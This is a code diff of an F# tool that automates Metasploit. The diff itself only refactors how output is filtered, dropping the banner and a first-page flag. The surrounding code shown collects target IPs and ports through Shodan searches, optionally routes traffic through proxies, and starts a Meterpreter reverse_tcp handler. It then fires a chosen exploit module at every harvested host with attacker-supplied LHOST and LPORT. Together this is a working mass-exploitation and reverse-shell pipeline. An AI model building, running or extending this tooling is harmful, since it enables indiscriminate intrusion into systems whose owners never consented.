@@ -4,8 +4,8 @@ open System.Diagnostics
 
 module Program =
 
-    // Function to execute Metasploit commands and filter output to exclude the banner and specific unwanted lines
-    let runMetasploitCommand (command: string) (logFilePath: string) (isFirstPage: bool) =
+    // Function to execute Metasploit commands, filter out the banner, and display the rest of the output
+    let runMetasploitCommand (command: string) (logFilePath: string) =
         let startInfo = new ProcessStartInfo()
         startInfo.FileName <- "/bin/bash"
         startInfo.Arguments <- sprintf "-c \"msfconsole -x '%s'\"" command
@@ -26,41 +26,30 @@ module Program =
         // Write all output to log.txt
         File.AppendAllText(logFilePath, output)
 
+        // Filter the output to exclude the Metasploit banner
+        let lines = output.Split('\n')
+        let mutable inBanner = false
+
+        lines
+        |> Array.iter (fun line ->
+            let trimmedLine = line.Trim()
+
+            // Detect the start and end of the Metasploit banner
+            if trimmedLine.StartsWith("Metasploit tip:") then
+                inBanner <- true
+
+            // Print lines that are not within the banner
+            if not inBanner then
+                printfn "%s" line
+
+            // End banner detection when the documentation line appears
+            if trimmedLine.StartsWith("Metasploit Documentation:") then
+                inBanner <- false
+        )
+
+        // Display any errors if present
         if proc.ExitCode <> 0 then
             printfn "Error executing command: %s" errorOutput
-        else
-            // Filter the output to exclude the Metasploit banner and specific unwanted lines
-            let lines = output.Split('\n')
-            let mutable inBanner = false
-            let mutable displayedResults = 0
-
-            lines
-            |> Array.iter (fun line ->
-                let trimmedLine = line.Trim()
-
-                // Detect the start and end of the Metasploit banner
-                if trimmedLine.StartsWith("Metasploit tip:") then
-                    inBanner <- true
-
-                // Print lines that are not within the banner and don't match the specific unwanted messages
-                if not inBanner 
-                    && not (trimmedLine.Contains("Unknown datastore option: LHOST")) 
-                    && not (trimmedLine.Contains("Unknown datastore option: LPORT")) then
-                    
-                    // If this is a Shodan result line and fewer than 10 results have been shown, display the result
-                    if displayedResults < 10 && (trimmedLine.Contains("Shodan") || trimmedLine.Contains("host")) then
-                        printfn "%s" line
-                        displayedResults <- displayedResults + 1
-
-                    // If we hit 10 results, print "-----snip-----" and stop printing
-                    if displayedResults = 10 then
-                        printfn "-----snip-----"
-                        displayedResults <- displayedResults + 1 // Stop displaying results
-
-                // End banner detection when the documentation line appears
-                if trimmedLine.StartsWith("Metasploit Documentation:") then
-                    inBanner <- false
-            )
 
     // Function to get user input (for reusability)
     let getUserInput prompt =
@@ -74,7 +63,7 @@ module Program =
             let proxyType = getUserInput "Enter the proxy type (socks4/socks5/http): "
             let proxyHostPort = getUserInput "Enter the proxy host and port in format host:port: "
             let proxyCommand = sprintf "setg proxies %s:%s" proxyType proxyHostPort
-            runMetasploitCommand proxyCommand logFilePath false
+            runMetasploitCommand proxyCommand logFilePath
             Some (sprintf "setg proxies %s:%s" proxyType proxyHostPort) // Return the proxy command to use it later
         else
             printfn "No proxy configured."
@@ -83,7 +72,7 @@ module Program =
     // Start multi-handler listener
     let startMultiHandler lhost lport logFilePath =
         let command = sprintf "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; run -j; exit" lhost lport
-        runMetasploitCommand command logFilePath false
+        runMetasploitCommand command logFilePath
 
     // Run the Shodan search and write only IP:Port results to a file
     let executeShodanSearch apiKey query maxPage logFilePath =
@@ -94,7 +83,7 @@ module Program =
 
         // Run the Shodan search, output to results.txt, and set max page
         let command = sprintf "use auxiliary/gather/shodan_search; set SHODAN_APIKEY %s; set QUERY '%s'; set OUTFILE %s; set maxpage %s; run; exit" apiKey query resultsFile maxPage
-        runMetasploitCommand command logFilePath true
+        runMetasploitCommand command logFilePath
 
         // After running the search, clean up the results to keep only the IP:Port lines
         let allResults = File.ReadAllLines(resultsFile)
@@ -145,7 +134,7 @@ module Program =
                     match proxyCommand with
                     | Some proxyCmd -> sprintf "%s; use %s; set RHOST %s; set RPORT %s; set LHOST %s; set LPORT %s; run; exit" proxyCmd moduleName ip port lhost lport
                     | None -> sprintf "use %s; set RHOST %s; set RPORT %s; set LHOST %s; set LPORT %s; run; exit" moduleName ip port lhost lport
-                runMetasploitCommand command logFilePath false
+                runMetasploitCommand command logFilePath
 
     // Main function
     [<EntryPoint>]
